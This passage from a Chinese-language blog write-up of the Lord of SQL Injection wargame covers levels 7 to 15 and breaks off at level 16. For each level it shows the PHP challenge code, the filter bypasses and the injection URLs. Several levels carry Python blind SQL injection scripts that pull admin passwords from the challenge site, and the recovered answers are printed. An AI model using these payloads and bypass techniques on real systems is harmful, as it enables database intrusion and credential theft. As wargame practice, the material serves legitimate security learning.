class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orge&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟第四题一样，只是过滤了or，只需要通过<code>||</code>替换or即可，可以用同一个脚本进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;123&#x27;+||+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">ord</span>(s)), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+s</span><br><span class="line">            print(temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注入出来的结果是<code>7b751aec</code>，pw传入这个值即可通关</p><h1 id="8-troll"><a href="#8-troll" class="headerlink" title="8. troll"></a>8. troll</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin/&quot;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  $query = <span class="string">&quot;select id from prob_troll where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;troll&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题被坑了很久，preg_match对admin是没有忽略大小写的，所以可以直接大小写绕过即可，单引号在这里是没有办法进行绕过的</p><p><code>https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=Admin</code></p><h1 id="9-vampire"><a href="#9-vampire" class="headerlink" title="9. vampire"></a>9. vampire</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  $_GET[id] = strtolower($_GET[id]);</span><br><span class="line">  $_GET[id] = str_replace(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;&quot;</span>,$_GET[id]); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_vampire where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;vampire&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题很简单，对admin采取了替换的方式，直接可以使用双写绕过</p><p><code>https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin</code></p><h1 id="10-skeleton"><a href="#10-skeleton" class="headerlink" title="10. skeleton"></a>10. skeleton</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接通过注释符将后面的语句注释掉</p><p><code>https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=123&#39;+union+select+&#39;admin&#39;%23</code></p><h1 id="11-golem"><a href="#11-golem" class="headerlink" title="11. golem"></a>11. golem</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了substr可以用mid或者substring替代，and和or可以分别用&amp;&amp;和||进行替换，要查询admin的密码，需要用以下payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,1,1)+like+&#x27;a</span></span><br></pre></td></tr></table></figure><p>用python写成脚本跑密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,&#123;&#125;,1)+like+&#x27;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, s), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+s</span><br><span class="line">            print(temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后得到admin的pw为:<code>77d6290b</code></p><h1 id="12-darkknight"><a href="#12-darkknight" class="headerlink" title="12. darkknight"></a>12. darkknight</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;darkknight&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了ascii可以用ord替换，过滤了=号可以用&lt;&gt;不等号进行替换，不能用单引号闭合，则在no参数进行注入。注入的paylaod如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1+or+id+like+0x61646d696e+and+ord(mid(pw,1,1))&lt;&gt;22</span></span><br></pre></td></tr></table></figure><p>写python脚本进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1+or+id+like+0x61646d696e+and+ord(mid(pw,&#123;&#125;,1))&lt;&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&amp;no=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">ord</span>(s)), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+s</span><br><span class="line">            print(temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>等到admin的pw为：<code>0b70ea1f</code></p><h1 id="13-bugbear"><a href="#13-bugbear" class="headerlink" title="13. bugbear"></a>13. bugbear</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;bugbear&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多，直接贴代码吧，用in来判断字符可以避免使用like、=、regexp等，no可以使用no&gt;1&amp;&amp;no&lt;3来使no指向2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1||no&lt;3%26%26no&gt;1%26%26mid(pw,&#123;&#125;,1)/**/in(&quot;&#123;&#125;&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&amp;no=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, s), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+s</span><br><span class="line">            print(temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来密码：<code>52dc3991</code></p><h1 id="14-giant"><a href="#14-giant" class="headerlink" title="14. giant"></a>14. giant</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\n|\r|\t/i&#x27;</span>, $_GET[shit])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select 1234 from<span class="subst">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="number">1234</span>]) solve(<span class="string">&quot;giant&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要让from和表名间出现一个空格，过滤了一些字符，这个很简单，直接用burp进行fuzz，%00-%ff共256种可能，共发现<code>%0b</code>,<code>%0c</code>，可以绕过</p><h1 id="15-assassin"><a href="#15-assassin" class="headerlink" title="15. assassin"></a>15. assassin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>like型注入，可以使用通配符<code>%</code>进行注入，先单个跑出来存在的字符为<code>def0129</code>，再进行一位一位的猜解，在输入<code>902%</code>的时候即可通关。</p><h1 id="16-SUCCUBUS"><a href="#16-SUCCUBUS" class="headerlink" title="16. SUCCUBUS"></a>16. SUCCUBUS</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 